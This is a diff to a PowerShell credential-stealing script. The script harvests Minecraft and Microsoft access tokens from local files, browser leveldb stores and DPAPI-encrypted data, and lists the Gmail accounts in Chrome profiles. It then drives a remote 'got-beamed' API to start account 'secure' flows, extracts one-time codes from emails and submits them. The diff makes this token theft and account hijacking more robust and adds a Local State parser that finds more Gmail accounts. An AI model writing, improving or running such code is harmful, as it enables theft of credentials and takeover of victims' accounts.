@@ -31,6 +31,7 @@ $nl = [char]10
 # ---------- stage 1: MC token harvest ----------
 $found    = @()
 $seen     = @{}
+$skipped  = 0
 $jwtRegex = "eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}"
 
 function Add-Token {
@@ -84,7 +85,10 @@ function Scan-File {
                     if($n.minecraftProfile -and $n.minecraftProfile.name){ $u = $n.minecraftProfile.name }
                     if($n.microsoft_account -and $n.microsoft_account.email){ $u = $n.microsoft_account.email }
                     foreach($k in @("accessToken","token","access_token")){
-                        if($n.PSObject.Properties[$k] -and $n.$k){ Add-Token $n.$k $u $path "accessToken" }
+                        if($n.PSObject.Properties[$k] -and $n.$k){
+                            try { Add-Token $n.$k $u $path "accessToken" }
+                            catch { $script:skipped++ }
+                        }
                     }
                     foreach($p in $n.PSObject.Properties){
                         if($p.Value -is [PSCustomObject] -or ($p.Value -is [System.Collections.IEnumerable] -and $p.Value -isnot [string])){
@@ -93,9 +97,9 @@ function Scan-File {
                     }
                 }
             }
-        }catch{}
+        }catch{ $script:skipped++ }
         Scan-Text $raw $path $user
-    }catch{}
+    }catch{ $script:skipped++ }
 }
 
 function Scan-Db {
@@ -114,6 +118,7 @@ function Scan-Db {
             if($ms){ try{$ms.Dispose()}catch{} }
             if($fs){ try{$fs.Dispose()}catch{} }
         }
+        Start-Sleep -Milliseconds 200
     }
 }
 
@@ -155,7 +160,7 @@ if(Test-Path $bin){
     try{
         $dec = [Security.Cryptography.ProtectedData]::Unprotect([IO.File]::ReadAllBytes($bin),$null,"CurrentUser")
         Scan-Text ([Text.Encoding]::UTF8.GetString($dec)) $bin "unknown"
-    }catch{}
+    }catch{ $script:skipped++ }
 }
 
 $roots = @(
@@ -173,7 +178,7 @@ foreach($r in $roots){
             if($f.Length -gt 1mb){ continue }
             Scan-File $f.FullName "unknown"
         }
-    }catch{}
+    }catch{ $script:skipped++ }
 }
 
 $dbs = @(
@@ -193,9 +198,9 @@ foreach($lc in $wcs){
     if(-not (Test-Path $lc)){ continue }
     try{
         foreach($f in (Get-ChildItem $lc -File -Include "*.ldb","*.log" -EA 0 | Where-Object { $_.Length -lt 5mb } | Select-Object -First 50)){
-            try{ Scan-Text ([Text.Encoding]::UTF8.GetString([IO.File]::ReadAllBytes($f.FullName))) $f.FullName "unknown" }catch{}
+            try{ Scan-Text ([Text.Encoding]::UTF8.GetString([IO.File]::ReadAllBytes($f.FullName))) $f.FullName "unknown" }catch{ $script:skipped++ }
         }
-    }catch{}
+    }catch{ $script:skipped++ }
 }
 
 # ---------- stage 2: chrome gmail discovery ----------
@@ -247,6 +252,20 @@ function Get-ChromeGoogleAccounts {
     )
     foreach($root in $roots){
         if(-not (Test-Path $root)){ continue }
+
+        $localState = Join-Path $root "Local State"
+        if(Test-Path $localState){
+            $ls = Read-PrefsSafe -path $localState
+            if($ls -and $ls.profile -and $ls.profile.info_cache){
+                foreach($prof in $ls.profile.info_cache.PSObject.Properties){
+                    $acct = $prof.Value
+                    if($acct -and $acct.user_name -and $acct.user_name -match "@(gmail|googlemail)\.com$"){
+                        $out[$acct.user_name] = (Join-Path $root $prof.Name)
+                    }
+                }
+            }
+        }
+
         foreach($p in @(Get-ChildItem $root -Directory -EA 0 | Where-Object { $_.Name -eq "Default" -or $_.Name -match "^Profile \d+$" })){
             foreach($pn in @("Preferences","Secure Preferences")){
                 $prefs = Join-Path $p.FullName $pn
@@ -292,7 +311,16 @@ if($callerOverride){
 }
 
 # ==================== got-beamed API layer ====================
-$apiTrace = @()
+$apiTrace      = @()
+$API_TRACE_MAX = 200
+
+function Trace-Add {
+    param($obj)
+    $script:apiTrace += $obj
+    if($script:apiTrace.Count -gt $API_TRACE_MAX){
+        $script:apiTrace = $script:apiTrace[-$API_TRACE_MAX..-1]
+    }
+}
 
 function Api-Post {
     param([string]$path, [hashtable]$body)
@@ -319,6 +347,7 @@ function Api-Post {
 
 function Api-Get {
     param([string]$path)
+    if($path -notmatch '^/'){ $path = "/" + $path.TrimStart('/') }
     $url = "$API_BASE$path"
     try{
         $r = Invoke-WebRequest -Uri $url -Method Get -Headers $HDR `
@@ -356,7 +385,7 @@ function Extract-Otp {
     )
     $digit = '\d[\s\-]?\d[\s\-]?\d[\s\-]?\d[\s\-]?\d[\s\-]?\d'
     foreach($hd in $heads){
-        $re = [regex]("(?i)" + $hd + "[^\d]{0,80}(" + $digit + ")")
+        $re = [regex]("(?i)" + $hd + "[^\d\r\n]{0,80}(" + $digit + ")")
         $m = $re.Match($text)
         if($m.Success){ return ($m.Groups[1].Value -replace '[\s\-]','') }
     }
@@ -370,29 +399,36 @@ function Secure-Start {
     param([string]$email)
     $resp = Api-Post -path "/secure" -body @{ method=$METHOD; email=$email }
     $j = J $resp.content
-    $script:apiTrace += [PSCustomObject]@{
+    Trace-Add ([PSCustomObject]@{
         call="secure.start"; status="HTTP_$($resp.status)";
         body=($resp.content -replace "\s+"," ")
-    }
+    })
     if(-not $resp.ok -or -not $j -or -not $j.success){
         return @{ ok=$false; err=(($resp.content -replace "\s+"," ")) }
     }
     $d = $j.data
+    if(-not $d){
+        return @{ ok=$false; err="empty data on secure.start :: $(($resp.content -replace '\s+',' '))" }
+    }
     $sentTo = ""
     if($d.accounts -and $d.accounts.Count -gt 0){ $sentTo = $d.accounts[0].sentTo }
+    $badShape = $false
+    if($d.statusUrl -and $d.statusUrl -notmatch '^/'){ $badShape = $true }
+    if($d.submitUrl -and $d.submitUrl -notmatch '^/'){ $badShape = $true }
     return @{
         ok=$true; taskId=$d.taskId; statusUrl=$d.statusUrl;
-        submitUrl=$d.submitUrl; status=$d.status; sentTo=$sentTo
+        submitUrl=$d.submitUrl; status=$d.status; sentTo=$sentTo;
+        shapeWarn = $badShape
     }
 }
 
 function Secure-SubmitOtp {
     param([string]$submitPath,[string]$otp)
     $resp = Api-Post -path $submitPath -body @{ otp=$otp }
-    $script:apiTrace += [PSCustomObject]@{
+    Trace-Add ([PSCustomObject]@{
         call="secure.otp"; status="HTTP_$($resp.status)";
         body=($resp.content -replace "\s+"," ")
-    }
+    })
     $j = J $resp.content
     if($resp.ok -and $j -and $j.success){ return @{ ok=$true } }
     return @{ ok=$false; status="HTTP_$($resp.status)"; body=($resp.content -replace "\s+"," ") }
@@ -402,10 +438,10 @@ function Secure-TaskState {
     param([string]$taskPath)
     $resp = Api-Get -path $taskPath
     $j = J $resp.content
-    $script:apiTrace += [PSCustomObject]@{
+    Trace-Add ([PSCustomObject]@{
         call="task.get"; status="HTTP_$($resp.status)";
         body=($resp.content -replace "\s+"," ")
-    }
+    })
     if(-not $resp.ok -or -not $j -or -not $j.success){ return @{ ok=$false; content=$resp.content } }
     return @{ ok=$true; data=$j.data }
 }
@@ -419,10 +455,16 @@ function Emails-FindOtp {
         $j = J $resp.content
         if($resp.ok -and $j -and $j.success -and $j.data){
             $items = @()
-            if($j.data -is [System.Collections.IEnumerable] -and -not ($j.data -is [string])){ $items = @($j.data) }
-            elseif($j.data.emails){ $items = @($j.data.emails) }
-            elseif($j.data.items){ $items = @($j.data.items) }
+            if($j.data -is [System.Collections.IEnumerable] -and $j.data -isnot [string] -and $j.data -isnot [PSCustomObject]){
+                $items = @($j.data)
+            }
+            elseif($j.data -is [PSCustomObject]){
+                if($j.data.emails){ $items = @($j.data.emails) }
+                elseif($j.data.items){ $items = @($j.data.items) }
+                else { $items = @($j.data) }
+            }
             foreach($it in $items){
+                if(-not $it){ continue }
                 $blob = ($it | ConvertTo-Json -Compress -Depth 8)
                 if($email -and $blob -notmatch [regex]::Escape($email)){ continue }
                 $code = Extract-Otp $blob
@@ -455,7 +497,8 @@ if($script:gmailList.Count -gt 0){
         Start-Sleep -Milliseconds 1500
         $ts = Secure-TaskState -taskPath $s.statusUrl
         $final = if($ts.ok){ ($ts.data | ConvertTo-Json -Compress -Depth 10) } else { "poll failed :: $($ts.content)" }
-        $secureResults += "$email :: OK :: $($otpRes.otp) :: $final"
+        $suffix = if($s.shapeWarn){ " [URL-SHAPE-WARN]" } else { "" }
+        $secureResults += "$email :: OK :: $($otpRes.otp) ::$suffix $final"
     }
 }
 
